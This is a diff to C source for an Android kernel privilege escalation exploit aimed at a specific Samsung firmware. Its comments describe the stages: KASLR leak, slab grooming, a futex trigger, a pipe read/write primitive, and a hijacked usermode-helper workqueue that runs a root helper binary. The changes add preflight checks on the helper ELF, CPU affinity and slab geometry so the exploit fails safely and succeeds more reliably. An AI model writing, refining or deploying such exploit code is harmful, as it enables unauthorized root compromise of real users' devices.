@@ -21,6 +21,7 @@
 #include <sys/mman.h>
 #include <sys/prctl.h>
 #include <sys/resource.h>
+#include <sys/stat.h>
 #include <sys/syscall.h>
 #include <sys/wait.h>
 #include <time.h>
@@ -102,7 +103,7 @@ struct attempt_shared_state {
 _Static_assert(sizeof(struct attempt_shared_state) == 0x20,
                "attempt_shared_state must match the closed binary's mmap size");
 
-static void pin_to_cpu(int cpu);
+static int pin_to_cpu(int cpu);
 static void raise_rlimit_to_max(int resource);
 
 /* source: FUN_001044f4 @ 0x47ec-0x48f0. The successful worker forks a
@@ -215,8 +216,8 @@ static int do_one_attempt_post_trigger(void *ctx_v) {
   __atomic_store_n(&ctx->shared->status, ATTEMPT_PIPE_READY,
                    __ATOMIC_RELEASE);
 
-  /* root_umh uses configfs only for SELinux and the static workqueue slot;
-   * dynamic slab state uses pipe R/W. Owner cleanup below follows FUN076c0. */
+  /* Root bootstrap uses configfs only for SELinux/static workqueue lookup;
+   * dynamic workqueue state uses the already-proven pipe R/W primitive. */
   int rooted = root_umh_install_fd_tracked(
       fd, ctx->kernel_base, ctx->payload_base, ctx->root_umh_path,
       &ctx->shared->status, ATTEMPT_WORKQUEUE_MUTATED);
@@ -243,13 +244,38 @@ static int do_one_attempt(struct attempt_shared_state *shared,
   raise_rlimit_to_max(RLIMIT_NOFILE);
   raise_rlimit_to_max(RLIMIT_NPROC);
 
+  const char *root_umh_path = getenv("CVE43499_ROOT_HELPER");
+  struct stat helper_stat;
+  unsigned char helper_magic[4] = {0};
+  int helper_fd = root_umh_path && root_umh_path[0] == '/'
+                      ? open(root_umh_path, O_RDONLY | O_CLOEXEC)
+                      : -1;
+  ssize_t helper_got = -1;
+  if (helper_fd >= 0) {
+    do {
+      helper_got = pread(helper_fd, helper_magic, sizeof(helper_magic), 0);
+    } while (helper_got < 0 && errno == EINTR);
+  }
+  int helper_close = helper_fd >= 0 ? close(helper_fd) : -1;
+  if (!root_umh_path || stat(root_umh_path, &helper_stat) != 0 ||
+      !S_ISREG(helper_stat.st_mode) || helper_stat.st_size < 4096 ||
+      access(root_umh_path, X_OK) != 0 ||
+      helper_got != (ssize_t)sizeof(helper_magic) || helper_close != 0 ||
+      memcmp(helper_magic, "\x7f" "ELF", sizeof(helper_magic)) != 0) {
+    fprintf(stderr, "[preflight] invalid root helper errno=%d\n", errno);
+    return 0;
+  }
+
   /* FUN_001044f4 calls FUN_001057e0 before KASLR and grooming. Do not
    * trigger the corruption unless its later FUN_00105968 open can succeed. */
   if (!oss_prepare_kernel_rw_path()) {
     fprintf(stderr, "[aar_aaw] no openable ashmem node before exploit\n");
     return 0;
   }
-  pin_to_cpu(0);
+  if (!pin_to_cpu(0)) {
+    fprintf(stderr, "[preflight] CPU-0 affinity failed errno=%d\n", errno);
+    return 0;
+  }
 
   /* source: FUN_001044f4 -- puts("stage=locating-kernel"); FUN_0010757c(). */
   puts("\x1b[33m[*] \x1b[0mstage=locating-kernel");
@@ -307,6 +333,17 @@ static int do_one_attempt(struct attempt_shared_state *shared,
             before.objperslab, before.active_slabs, before.num_slabs);
   } else {
     fprintf(stderr, "[kaslr] /proc/slabinfo mm_struct line not found\n");
+    return 0;
+  }
+  if (before.objsize != 1024 || before.objperslab != 32 ||
+      before.pagesperslab != 8 || before.active_objs > 2048 ||
+      before.num_objs > 2048 || before.num_slabs > 48) {
+    fprintf(stderr,
+            "[preflight] mm_struct geometry/load rejected size=%lu per=%lu "
+            "pages=%lu active=%lu total=%lu slabs=%lu\n",
+            before.objsize, before.objperslab, before.pagesperslab,
+            before.active_objs, before.num_objs, before.num_slabs);
+    return 0;
   }
 
   /* source: target.h for dm3q-S918BXXSAFZH3 (already verified against
@@ -343,17 +380,7 @@ static int do_one_attempt(struct attempt_shared_state *shared,
    * trigger in this clean-room engine -- everything before this point
    * (tracefs, kernelsnitch leak, groom+spray) is read-only or userspace
    * reclaim only. */
-  /* source: root_umh.h -- same call_usermodehelper_exec_work workqueue
-   * hijack the closed binary's FUN_00108fa4 performs, reused as-is
-   * (see root_umh.h header comment). root_umh_path is this project's
-   * own prebuilt UMH helper (build/dm3q-S918BXXSAFZH3/
-   * cve-2026-43499-root), staged on-device and passed the same way the
-   * real app passes CVE43499_ROOT_HELPER. */
-  const char *root_umh_path = getenv("CVE43499_ROOT_HELPER");
-  if (!root_umh_path || root_umh_path[0] != '/') {
-    fprintf(stderr, "[root_umh] missing CVE43499_ROOT_HELPER\n");
-    return 0;
-  }
+  /* root_umh_path was validated before KASLR and allocator grooming. */
 
   /* source: run_futex_trigger_v11_{cb,full} (futex_trigger.h/.c) --
    * supersedes v10 in this wiring. v10's own comment claimed the real
@@ -419,11 +446,11 @@ static int do_one_attempt(struct attempt_shared_state *shared,
  * kept as a small standalone copy here rather than sharing a header,
  * since it's a two-line wrapper and this file doesn't otherwise depend
  * on futex_trigger.c's internals). */
-static void pin_to_cpu(int cpu) {
+static int pin_to_cpu(int cpu) {
   cpu_set_t set;
   CPU_ZERO(&set);
   CPU_SET(cpu, &set);
-  sched_setaffinity(0, sizeof(set), &set);
+  return sched_setaffinity(0, sizeof(set), &set) == 0;
 }
 
 /* source: fcn.000044f4, raw vaddr 0x4520-0x4570 (raw disasm, `asm.varsub`
